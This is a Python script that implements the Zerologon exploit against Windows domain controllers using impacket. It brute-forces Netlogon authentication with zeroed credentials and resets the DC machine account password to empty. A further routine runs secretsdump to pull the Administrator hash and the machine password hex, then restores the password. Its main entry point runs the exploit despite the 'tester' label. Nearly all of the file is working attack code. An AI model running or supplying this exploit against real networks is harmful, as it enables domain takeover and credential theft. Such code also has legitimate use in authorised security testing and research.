#!/usr/bin/env python3

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto

import hmac, hashlib, struct, sys, socket, time
import re
import subprocess
from binascii import hexlify, unhexlify
from subprocess import check_call
import os
import sys

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

def fail(msg):
    raise RuntimeError(
        f"{msg} This might have been caused by invalid arguments or network issues."
    )

def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):
    # Connect to the DC's Netlogon service.


    # Use an all-zero challenge and credential.
    plaintext = b'\x00' * 8
    ciphertext = b'\x00' * 8

    # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
    flags = 0x212fffff

    # Send challenge and authentication request.
    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
    try:
        server_auth = nrpc.hNetrServerAuthenticate3(
            rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            target_computer + '\x00', ciphertext, flags
        )


        # It worked!
        assert server_auth['ErrorCode'] == 0
        return True

    except nrpc.DCERPCSessionError as ex:
        # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
        if ex.get_error_code() == 0xc0000022:
            return None
        else:
            fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
    except BaseException as ex:
        fail(f'Unexpected error: {ex}.')

def exploit(dc_handle, rpc_con, target_computer):
    request = nrpc.NetrServerPasswordSet2()
    request['PrimaryName'] = dc_handle + '\x00'
    request['AccountName'] = target_computer + '$\x00'
    request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
    authenticator['Credential'] = b'\x00' * 8
    authenticator['Timestamp'] = 0
    request['Authenticator'] = authenticator
    request['ComputerName'] = target_computer + '\x00'
    request['ClearNewPassword'] = b'\x00' * 516
    return rpc_con.request(request)

def _open_rpc_connection(dc_ip):
    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
    rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
    rpc_con.connect()
    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
    return rpc_con


def _attempt_zero_authentication(rpc_con, dc_handle, dc_ip, target_computer):
    for attempt in range(0, MAX_ATTEMPTS):
        result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)
        if result is None:
            continue
        return True
    return False


def check_zerologon(dc_name, dc_ip):
    if not dc_name or not dc_ip:
        return ["Missing DC name or DC IP."]

    dc_name = dc_name.rstrip('$')
    dc_handle = '\\\\' + dc_name

    try:
        rpc_con = _open_rpc_connection(dc_ip)
        vulnerable = _attempt_zero_authentication(rpc_con, dc_handle, dc_ip, dc_name)
    except Exception as exc:
        return [f"Zerologon check failed: {exc}"]

    if vulnerable:
        return ["Target appears vulnerable to Zerologon."]
    return ["Target appears patched against Zerologon."]


def run_zerologon(dc_name, dc_ip):
    if not dc_name or not dc_ip:
        return ["Missing DC name or DC IP."]

    dc_name = dc_name.rstrip('$')
    dc_handle = '\\\\' + dc_name

    try:
        rpc_con = _open_rpc_connection(dc_ip)
        vulnerable = _attempt_zero_authentication(rpc_con, dc_handle, dc_ip, dc_name)
        if not vulnerable:
            return ["Attack failed. Target is probably patched."]

        result = None
        for attempt in range(0, MAX_ATTEMPTS):
            try:
                result = exploit(dc_handle, rpc_con, dc_name)
            except nrpc.DCERPCSessionError as ex:
                if ex.get_error_code() == 0xc0000022:
                    continue
                fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
            except BaseException as ex:
                fail(f'Unexpected error: {ex}.')

            if result is not None:
                break

        if result is None:
            return ["Exploit failed to complete after retries."]

        error_code = None
        try:
            error_code = result["ErrorCode"]
        except Exception:
            error_code = None

        if error_code == 0:
            return ["Exploit complete. Machine account password reset to empty string."]
        if error_code is None:
            return ["Exploit returned an unexpected response from the DC."]
        return [f"Exploit returned error code: {error_code}"]
    except Exception as exc:
        return [f"Zerologon exploit failed: {exc}"]


def _parse_admin_hash(output):
    for line in output.splitlines():
        if not line.lower().startswith("administrator:"):
            continue
        parts = line.split(":")
        if len(parts) > 3:
            return parts[3].strip()
    return None


def _parse_plain_password_hex(output):
    for line in output.splitlines():
        match = re.search(r"plain_password_hex\s*[:=]\s*([0-9a-fA-F]+)", line, re.IGNORECASE)
        if not match:
            continue
        value = match.group(1).strip()
        if value:
            return value
    return None


def _secretsdump(command):
    return subprocess.run(command, capture_output=True, text=True)


def restore_machine_account_password_impacket(
    domain,
    dc_ip,
    dc_name,
    machine_account,
):
    if not domain or not dc_ip or not dc_name:
        return ["Missing domain, DC IP, or DC name."]
    if not machine_account:
        return ["Missing machine account."]

    account_name = machine_account.strip()
    if not account_name.endswith("$"):
        account_name = f"{account_name}$"
    account_host = account_name.rstrip("$")

    step_results = []

    admin_hash_cmd = [
        "impacket-secretsdump",
        f"{domain}/{account_name}@{dc_ip}",
        "-no-pass",
    ]
    admin_hash_result = _secretsdump(admin_hash_cmd)
    admin_hash_output = admin_hash_result.stdout or admin_hash_result.stderr
    admin_hash = _parse_admin_hash(admin_hash_output)
    if not admin_hash:
        message = admin_hash_result.stderr.strip() or "Administrator hash not found."
        return [f"Restore failed: {message}"]
    step_results.append("Administrator hash collected.")

    password_hex_cmd = [
        "impacket-secretsdump",
        f"{domain}/Administrator@{account_host}",
        "-hashes",
        f":{admin_hash}",
    ]
    password_hex_result = _secretsdump(password_hex_cmd)
    password_hex_output = password_hex_result.stdout or password_hex_result.stderr
    password_hex = _parse_plain_password_hex(password_hex_output)
    if not password_hex:
        message = password_hex_result.stderr.strip() or "plain_password_hex not found."
        return [f"Restore failed: {message}"]
    if len(password_hex) % 2 != 0:
        return ["Restore failed: plain_password_hex is not valid hex (odd length)."]
    step_results.append("Machine account password hex extracted.")

    restore_script = os.path.join(
        os.path.dirname(__file__),
        "tools",
        "restorepassword.py",
    )
    restore_cmd = [
        sys.executable,
        restore_script,
        f"{domain}/{account_host}@{dc_name}",
        "-target-ip",
        dc_ip,
        "-hexpass",
        password_hex,
    ]
    restore_result = _secretsdump(restore_cmd)
    restore_output = restore_result.stdout or restore_result.stderr
    if restore_result.returncode != 0:
        message = restore_result.stderr.strip() or "Restorepassword failed."
        return [f"Restore failed: {message}"]
    if restore_output.strip():
        step_results.extend(restore_output.strip().splitlines())
    else:
        step_results.append("Machine account password restored.")

    verify_cmd = [
        "impacket-secretsdump",
        f"{domain}/{account_name}@{dc_ip}",
        "-no-pass",
    ]
    verify_result = _secretsdump(verify_cmd)
    verify_output = verify_result.stdout or verify_result.stderr
    if verify_result.returncode == 0 and "Administrator:" in verify_output:
        step_results.append("Verification failed: machine account password is still blank.")
    else:
        step_results.append("Verification passed: machine account password is not blank.")

    return step_results

def main():
    if not (3 <= len(sys.argv) <= 4):
        print('Usage: zerologon_tester.py <dc-name> <dc-ip>\n')
        print('Tests whether a domain controller is vulnerable to the Zerologon attack. Resets the DC account password to an empty string when vulnerable.')
        print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
        sys.exit(1)
    else:
        [_, dc_name, dc_ip] = sys.argv
        try:
            results = run_zerologon(dc_name, dc_ip)
        except RuntimeError as exc:
            print(exc, file=sys.stderr)
            sys.exit(2)

        for line in results:
            print(line)

if __name__ == '__main__':
    main()
